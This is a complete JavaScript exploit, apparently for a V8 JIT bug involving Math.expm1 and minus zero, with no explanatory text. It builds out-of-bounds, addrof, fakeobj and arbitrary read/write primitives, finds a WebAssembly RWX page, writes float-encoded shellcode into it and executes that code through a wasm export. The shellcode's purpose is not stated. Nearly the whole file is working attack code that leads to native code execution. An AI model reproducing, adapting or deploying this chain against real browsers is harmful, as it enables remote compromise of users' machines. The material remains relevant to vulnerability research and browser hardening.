//conversion logic
let conversionBuffer = new ArrayBuffer(0x8);
let floatBuffer = new Float64Array(conversionBuffer);
let uint64Buffer = new BigUint64Array(conversionBuffer);
let uint32Buffer = new Uint32Array(conversionBuffer)

BigInt.prototype.hex = function() {
  return '0x' + this.toString(16);
};

BigInt.prototype.i2f = function() {
  uint64Buffer[0] = this;
  return floatBuffer[0];
}

BigInt.prototype.smi2f = function() {
  uint64Buffer[0] = this 
  uint32Buffer[1] = uint32Buffer[0];
  uint32Buffer[0] = 0
  return floatBuffer[0]
}

Number.prototype.f2i = function() {
  floatBuffer[0] = this;
  return uint64Buffer[0];
}
Number.prototype.i2f = function() {
  return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
  return BigInt(this).smi2f();
}

Number.prototype.hex = function() {
  floatBuffer[0] = this
  return uint64Buffer[0].hex()
}

class Primitives{

  constructor(bigArray) {
    this.bigArray = bigArray;

    if(bigArray.length != 4096 * 30){
      delete this.bigArray
      return
    }

    this.floatArray1 = new Array(4)
    this.floatArray1[0] = 1.1
    this.floatArray1[1] = 2.2
    this.floatArray1[2] = 3.3
    this.floatArray1[3] = 4.4

    this.objArray = new Array(4)
    this.objArray[0] = {}
    this.objArray[1] = 41
    this.objArray[2] = 42
    this.objArray[3] = 43

    this.floatArray2 = new Array(4)
    this.floatArray2[0] = 2.4
    this.floatArray2[1] = 2.3
    this.floatArray2[2] = 2.2
    this.floatArray2[3] = 2.1

    this.arbRwArray = new Array(6.6, 6.5, 6.4, 6.3, 6.2, 6.1);

    let lastElementsArray = undefined
    let lengthsFound = 0

    for(let i = 0; i < 300; i++){
      if(this.bigArray[i] == (4).smi2f()){
        this.bigArray[i] = (100).smi2f()
      }
    }


    // i = the index of floatArray1 elements relative to bigArray. Assert this is true by checking the next 3 elements
    let i = bigArray.indexOf(1.1)

    if(i == -1){
      throw "Big problem don't know what happened"
    }

    if(this.bigArray[i+1] == 2.2 && this.bigArray[i+2] == 3.3 && this.bigArray[i+3] == 4.4){

      this.addrOfIndex = i;

      // when bigArray[addrOfIndex + 1] == (41).smi2f(), bigArray[addrOfIndex] will be the address of the empty object placed in objArray
      // keep adding until we have found this and if we go too high throw an exception 
      while(this.bigArray[this.addrOfIndex + 1] != (41).smi2f() || this.bigArray[this.addrOfIndex + 2] != (42).smi2f() || this.bigArray[this.addrOfIndex + 3] != (43).smi2f()){
        this.addrOfIndex += 1;


        if(this.addrOfIndex >= 100000){
          throw "Could not get reliable heap layout 1"
        }

      }

      // we want to find the index into floatArray1 to get to the empty object so we subtract the index into bigArray to get the empty object from the index to get the elements of floatArray1
      this.addrOfIndex -= i

      // repeat the same process for to find the index into objArray that can read a value from floatArray2
      this.fakeObjIndex = i 
      while(this.bigArray[this.fakeObjIndex] != 2.4 || this.bigArray[this.fakeObjIndex + 1] != 2.3 || this.bigArray[this.fakeObjIndex + 2] != 2.2 || this.bigArray[this.fakeObjIndex + 3] != 2.1){
        this.fakeObjIndex += 1;
        if(this.fakeObjIndex >= 1000){
          throw "Could not get reliable heap layout 2"
        }
      }
      // addrOfIndex + i gives us the index to find the elements for objArray, subtracting this from fakeObjIndex gives us the index into objArray to get a fake object
      this.fakeObjIndex -= (this.addrOfIndex + i); 
    }else{
      throw "Could not get reliable heap layout 3"
    }

    this.arbRWIndex = this.bigArray.indexOf((6).smi2f());

    if(this.arbRWIndex == -1 || this.bigArray[this.arbRWIndex + 1] == 6.6){
      throw "Could not get reliable heap layout 4"
    }

    this.bigArray[this.arbRWIndex] = (100).smi2f()
  }

  addrof(obj) {
    this.objArray[0] = obj;
    return this.floatArray1[this.addrOfIndex].f2i();
  }

  fakeobj(addr) {
    this.floatArray2[0] = addr.i2f();
    return this.objArray[this.fakeObjIndex]
  }

  read(addr, index=0) {

    if(this.oldArbRWIndex == undefined) {
      this.oldArbRWIndex = this.bigArray[this.arbRWIndex - 1]
    }

    this.bigArray[this.arbRWIndex - 1] = (addr - 0x10n).i2f(); 
    return this.arbRwArray[index].f2i();
  }

  write(addr, value, index=0){

    if(this.oldArbRWIndex == undefined) {
      this.oldArbRWIndex = this.bigArray[this.arbRWIndex - 1]
    }

    this.bigArray[this.arbRWIndex - 1] = (addr - 0x10n).i2f()
    this.arbRwArray[index] = value
  }
}

let primitives = undefined;

function getPrimitives(x=-0){
  let escape = {minusZero:-0};
  let oobArray = [1.1, 2.2, 1.3, 1.4];
  let bug = Object.is(Math.expm1(x), escape.minusZero);

  let bigArray = [0.1, 0.2, 0.3, 0.4];

  oobArray[bug * 15]  = (4096.0 * 30.0).smi2f();

  let ret = 0
  ret = oobArray[8 * bug]

  primitives = new Primitives(bigArray);

  return [ret, bigArray.length]

}

function exploit() {

  for(let i = 0; i < 0x1000; i++){
    getPrimitives(0);
  }

  for(let i = 0; i < 0x2000; i++){
    getPrimitives("0");
  }

  let ret = getPrimitives(-0);

  if(ret[0] != 0.1){
    throw "Could not trigger oob read, check bounds is probably still in place"
  }

  if(ret[1] != 4096 * 30){
    throw "Could not corrupt length of bigArray. Heap layout was not as expected"
  }

  let obj = {a:"primitives working"};

  let addr = primitives.addrof(obj)
  let fake = primitives.fakeobj(addr);

  if(!Object.is(fake, obj)){
    throw "Addrof or Fakeobj primitives are not working"
  }


  var importObject = {
    imports: { imported_func: arg => console.log(arg) }
  };

  //bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];

  bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x5, 0x1, 0x60, 0x0, 0x1, 0x7f, 0x3, 0x3, 0x2, 0x0, 0x0, 0x7, 0xd, 0x2, 0x3, 0x6f, 0x6e, 0x65, 0x0, 0x0, 0x3, 0x74, 0x77, 0x6f, 0x0, 0x1, 0xa, 0xb, 0x2, 0x4, 0x0, 0x41, 0x2a, 0xb, 0x4, 0x0, 0x41, 0x2b, 0xb];

  wasm_code = new Uint8Array(bc);

  wasm = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);

  let obj1 = {x:123}

  exported_function_addr = primitives.addrof(wasm.exports.one);

  let sharedFunctionInfo = primitives.read(exported_function_addr, 3)

  let wasmExportedFunctionData = primitives.read(sharedFunctionInfo, 1);

  let instance = primitives.read(wasmExportedFunctionData, 2);


  let rwx = primitives.read(instance, 29)

  primitives.write(primitives.addrof(primitives.objArray), (4).smi2f(), 3)


  rwx = rwx + BigInt(1)

  ;primitives.write(rwx, -3.3465786000529386e+101, 1)
primitives.write(rwx, -3.3465786000529386e+101, 2)
primitives.write(rwx, -3.3465786000529386e+101, 3)
primitives.write(rwx, -3.3465786000529386e+101, 4)
primitives.write(rwx, -3.3465786000529386e+101, 5)
primitives.write(rwx, -3.3465786000529386e+101, 6)
primitives.write(rwx, -3.3465786000529386e+101, 7)
primitives.write(rwx, -3.3465786000529386e+101, 8)
primitives.write(rwx, -3.3465786000529386e+101, 9)
primitives.write(rwx, -3.3465786000529386e+101, 10)
primitives.write(rwx, -2.2780470037701357e+82, 11)
primitives.write(rwx, 2.628740084842656e+244, 12)
primitives.write(rwx, 4.4994560211961836e+89, 13)
primitives.write(rwx, -2.3337341750598342e-38, 14)
primitives.write(rwx, 1.3703607360906093e+244, 15)
primitives.write(rwx, -1.531005497270707e+82, 16)
primitives.write(rwx, 2.5463030379957105e+89, 17)
primitives.write(rwx, -4.271981495884801e+96, 18)
primitives.write(rwx, 7.596465104455381e+89, 19)
primitives.write(rwx, 2.546300915418684e+89, 20)
primitives.write(rwx, -4.271981495883981e+96, 21)
primitives.write(rwx, -4.2719814958883825e+96, 22)
primitives.write(rwx, -2.5462993954915364e+89, 23)
primitives.write(rwx, 1.377614806545768e+244, 24)
primitives.write(rwx, -2.546306680499884e+89, 25)
primitives.write(rwx, -2.5463115371721157e+89, 26)
primitives.write(rwx, -4.271981495889779e+96, 27)
primitives.write(rwx, 4.282541975771919e+96, 28)
primitives.write(rwx, -2.5463771022472616e+89, 29)
primitives.write(rwx, -2.5617023314707723e+89, 30)
primitives.write(rwx, -2.182158320858998e-106, 31)
primitives.write(rwx, -3.075209652706586e+244, 32)
primitives.write(rwx, -3.3187415239016306e+245, 33)
primitives.write(rwx, -6.931032538542939e+274, 34)
primitives.write(rwx, -1.531005641447285e+82, 35)
primitives.write(rwx, -4.271981495883581e+96, 36)
primitives.write(rwx, -2.607236389469903e+244, 37)
primitives.write(rwx, -4.104298219818448e+245, 38)
primitives.write(rwx, -4.862735711107897e+89, 39)
primitives.write(rwx, -1.0169643237771338e+90, 40)
primitives.write(rwx, -1.5428629337216005e+82, 41)
primitives.write(rwx, -2.5860124043313195e+89, 42)
primitives.write(rwx, -4.271981495884801e+96, 43)
primitives.write(rwx, -2.832893667983457e+89, 44)
primitives.write(rwx, -9.471950697055664e+244, 45)
primitives.write(rwx, -2.546304559511292e+89, 46)
primitives.write(rwx, -2.2780033387485923e+82, 47)
primitives.write(rwx, -2.551211919462017e+89, 48)
primitives.write(rwx, -2.034978281115269e+236, 49)
primitives.write(rwx, -2.546305480560646e+89, 50)
primitives.write(rwx, -8.450568319731854e-227, 51)
primitives.write(rwx, 4.27280077449584e+96, 52)
primitives.write(rwx, -4.202374652455426e+48, 53)
primitives.write(rwx, -8.509836196900582e-227, 54)
primitives.write(rwx, -2.1821422404595136e-106, 55)
primitives.write(rwx, -2.551289242409175e+89, 56)
primitives.write(rwx, 4.383576533305606e-193, 57)
primitives.write(rwx, -2.550745295156405e+89, 58)
primitives.write(rwx, -3.5446867579240283e-106, 59)
primitives.write(rwx, -3.4084320430437674e-106, 60)
primitives.write(rwx, -4.5392421445404846e+89, 61)
primitives.write(rwx, -7.484351038197717e+244, 62)
primitives.write(rwx, -4.096283690128392e+270, 63)
primitives.write(rwx, -4.162320251673217e+270, 64)
primitives.write(rwx, -3.9642097902495944e+270, 65)
primitives.write(rwx, -4.030248633725406e+270, 66)
primitives.write(rwx, -2.546301809618208e+89, 67)
primitives.write(rwx, -4.271981495889809e+96, 68)
primitives.write(rwx, -1.1381131694890382e+108, 69)

  // clean up

  bigArrayAddr = primitives.addrof(primitives.bigArray)
  arbRwArrayAddr = primitives.addrof(primitives.arbRwArray)

  for(let i = 0; i < 300; i++){
    if(primitives.bigArray[i] == (100).smi2f()){
      primitives.bigArray[i] = (4).smi2f()
    }
  }

  primitives.write(bigArrayAddr, (primitives.arbRWIndex + 4).smi2f(), 3)

  primitives.bigArray[primitives.arbRWIndex - 1] = primitives.oldArbRWIndex
  primitives.bigArray[primitives.arbRWIndex] = (6).smi2f()

  wasm.exports.two()
}

exploit()
